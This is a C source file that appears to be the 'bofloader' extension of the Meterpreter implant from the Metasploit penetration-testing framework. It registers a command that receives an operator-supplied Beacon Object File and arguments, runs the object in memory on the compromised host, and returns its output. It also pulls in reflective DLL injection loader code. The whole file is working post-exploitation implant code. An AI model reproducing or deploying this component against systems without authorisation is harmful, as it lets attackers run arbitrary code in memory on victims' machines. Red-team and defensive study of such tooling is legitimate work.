/*!
 * @file bofloader.c
 * @brief Entry point for the bofloader extension.
 */

#include "common.h" 
#include "common_metapi.h" 
#include <stdint.h>
#include "bofloader.h"
#include "beacon_compatibility.h"
#include "COFFLoader.h"

// Required so that use of the API works.
MetApi* met_api = NULL;
#define RDIDLL_NOEXPORT
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

/*! @brief The enabled commands for this extension. */
Command customCommands[] =
{
	COMMAND_REQ(COMMAND_ID_BOFLOADER_EXECUTE, request_execute),
	COMMAND_TERMINATOR
};

/*!
 * @brief Handler for the generic command execution function.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */
DWORD request_execute(Remote* remote, Packet* packet)
{
	DWORD dwResult = ERROR_BAD_ARGUMENTS;
	Packet* response = NULL;
	PBYTE pBuffer = NULL;
	DWORD dwBufferSize = 0;
	LPSTR pBufferEntry = NULL;
	PBYTE pArguments = NULL;
	DWORD dwArgumentsSize = 0;
	LPSTR pOutputData = NULL;
	DWORD dwOutputDataSize = 0;

	do
	{
		response = met_api->packet.create_response(packet);
		if (!response)
			BREAK_WITH_ERROR("[BOFLOADER] met_api->packet.create_response failed", ERROR_INVALID_HANDLE);

		pBuffer = met_api->packet.get_tlv_value_raw(packet, TLV_TYPE_BOFLOADER_EXECUTE_BUFFER, &dwBufferSize);
		if (!pBuffer)
			BREAK_WITH_ERROR("[BOFLOADER] No EXECUTE_BUFFER was specified", ERROR_BAD_ARGUMENTS);

		pBufferEntry = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_BOFLOADER_EXECUTE_BUFFER_ENTRY);
		if (!pBufferEntry)
			BREAK_WITH_ERROR("[BOFLOADER] No EXECUTE_BUFFER_ENTRY was specified", ERROR_BAD_ARGUMENTS);

		pArguments = met_api->packet.get_tlv_value_raw(packet, TLV_TYPE_BOFLOADER_EXECUTE_ARGUMENTS, &dwArgumentsSize);
		if (!pArguments)
			BREAK_WITH_ERROR("[BOFLOADER] No EXECUTE_ARGUMENTS was specified", ERROR_BAD_ARGUMENTS);

		/* do our own check here to make sure the COFF data machine type matches, return ERROR_EXE_MACHINE_TYPE_MISMATCH on failure
		 */
		if (RunCOFF(pBufferEntry, pBuffer, dwBufferSize, pArguments, dwArgumentsSize))
			BREAK_WITH_ERROR("[BOFLOADER] Buffer execution failed", ERROR_INVALID_DATA);
		dprintf("[BOFLOADER] Buffer execution succeeded");
		
		dprintf("[BOFLOADER] Getting output data");
		pOutputData = BeaconGetOutputData(&dwOutputDataSize);
		if (pOutputData) {
			met_api->packet.add_tlv_string(response, TLV_TYPE_BOFLOADER_EXECUTE_RESULT, pOutputData);
			SecureZeroMemory(pOutputData, dwOutputDataSize);
			free(pOutputData);
		}
		dwResult = ERROR_SUCCESS;

	} while (0);

	if (response)
	{
		met_api->packet.transmit_response(dwResult, remote, response);
	}

	return dwResult;
}

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD InitServerExtension(MetApi* api, Remote* remote)
{
	met_api = api;
	SET_LOGGING_CONTEXT(api)
	met_api->command.register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD DeinitServerExtension(Remote *remote)
{
	met_api->command.deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Do a stageless initialisation of the extension.
 * @param ID of the extension that the init was intended for.
 * @param buffer Pointer to the buffer that contains the init data.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
{
	return ERROR_SUCCESS;
}

/*!
 * @brief Callback for when a command has been added to the meterpreter instance.
 * @param commandId The ID of the command that has been added.
 */
VOID CommandAdded(UINT commandId)
{
}
